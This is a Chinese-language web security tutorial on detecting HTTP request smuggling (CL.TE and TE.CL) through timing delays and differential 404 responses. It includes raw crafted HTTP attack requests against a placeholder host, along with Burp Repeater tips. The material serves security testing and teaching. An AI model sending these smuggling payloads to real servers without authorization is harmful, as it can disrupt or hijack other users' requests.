# 寻找 HTTP 请求走私漏洞

在本节中，我们将解释寻找 HTTP 请求走私漏洞的不同技术。

## 使用计时技术寻找 HTTP 请求走私漏洞

检测 HTTP 请求走私漏洞最通用的有效方法是发送请求，如果存在漏洞，这些请求会在应用程序的响应中引起时间延迟。Burp Scanner 使用这种技术来自动化检测请求走私漏洞。

> 仍为相同核心技术，概述小节描述劫持其他请求，此处描述攻击者初始请求的延迟：构造载荷，在前端发送请求并等待后端响应时，后端处于等待前端继续发送后续数据的死锁状态，从而产生可见的响应时间延迟

### 使用计时技术寻找 CL.TE 漏洞

如果应用程序容易受到 CL.TE 变体的请求走私攻击，那么发送如下请求通常会引发时间延迟：

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1[\r\n]
A
```

前端服务器使用 `Content-Length` 头，它转发请求的所有内容（直到 `A` 的4个字符），并等待后端响应。

后端服务器使用 `Transfer-Encoding` 头，处理第一个块，然后等待前端的下一个块到达（由于缺乏下一块/结尾序列，或此处设置更大的第一块长度）。这将导致可观察到的时间延迟。

### 使用计时技术寻找 TE.CL 漏洞

如果应用程序容易受到 TE.CL 变体的请求走私攻击，那么发送如下请求通常会引发时间延迟：

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0[\r\n]
[\r\n]
```

前端服务器使用 `Transfer-Encoding` 头，它转发请求的所有内容（5个字符），并等待后端响应。

后端服务器使用 `Content-Length` 头，期望消息体中有更多内容（6个字符），并等待前端的剩余内容到达。这将导致可观察到的时间延迟。

> **注意：** 针对 TE.CL 漏洞的基于时间的测试，如果应用程序容易受到 CL.TE 变体的影响，则可能干扰其他应用程序用户。因此，为了隐蔽并尽量减少干扰，您应首先进行 CL.TE 测试，仅当第一次测试不成功时才继续 TE.CL 测试。

## 使用差异化响应确认 HTTP 请求走私漏洞

当检测到可能的请求走私漏洞时，您可以通过利用它触发应用程序响应内容的差异来获得漏洞的进一步证据。这涉及快速连续地向应用程序发送两个请求：

- 一个“攻击”请求，旨在干扰下一个请求的处理。
- 一个“正常”请求。

如果正常请求的响应包含预期的干扰，则漏洞被确认。

例如，假设正常请求如下所示：

```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

此请求通常会收到状态码为 200 的 HTTP 响应，包含一些搜索结果。

干扰此请求所需的攻击请求取决于存在的请求走私变体：CL.TE 还是 TE.CL。

### 使用差异化响应确认 CL.TE 漏洞

要确认 CL.TE 漏洞，您将发送如下攻击请求：

```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```

如果攻击成功，此请求的最后两行将被后端服务器视为属于接收到的下一个请求。这将导致后续的“正常”请求看起来像这样：

```http
GET /404 HTTP/1.1
Foo: x
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

由于此请求现在包含一个无效的 URL，服务器将响应状态码 404，表明攻击请求确实干扰了它。

### 使用差异化响应确认 TE.CL 漏洞

要确认 TE.CL 漏洞，您将发送如下攻击请求：

```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 10


x=
0


```

> **注意：** 要使用 Burp Repeater 发送此请求，您首先需要转到 Repeater 菜单并确保取消选中“Update Content-Length”选项。您需要在最后的 `0` 之后包含尾随序列 `\r\n\r\n`。

如果攻击成功，从 `GET /404` 开始的所有内容都将被后端服务器视为属于接收到的下一个请求。这将导致后续的“正常”请求看起来像这样：

```http
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

由于此请求现在包含一个无效的 URL，服务器将响应状态码 404，表明攻击请求确实干扰了它。

> **注意：** 在尝试通过干扰其他请求来确认请求走私漏洞时，应注意一些重要事项：
>
> - “攻击”请求和“正常”请求应使用不同的网络连接发送到服务器。通过同一连接发送两个请求并不能证明漏洞存在。
> - “攻击”请求和“正常”请求应尽可能使用相同的 URL 和参数名称。这是因为许多现代应用程序根据 URL 和参数将前端请求路由到不同的后端服务器。使用相同的 URL 和参数增加了请求被同一后端服务器处理的机会，这对攻击成功至关重要。
> - 在测试“正常”请求以检测“攻击”请求的任何干扰时，您与应用程序同时接收的任何其他请求（包括来自其他用户的请求）处于竞争状态。您应在“攻击”请求之后立即发送“正常”请求。如果应用程序繁忙，您可能需要多次尝试以确认漏洞。
> - 在某些应用程序中，前端服务器充当负载均衡器，并根据某种负载均衡算法将请求转发到不同的后端系统。如果您的“攻击”和“正常”请求被转发到不同的后端系统，则攻击将失败。这是您可能需要多次尝试才能确认漏洞的另一个原因。
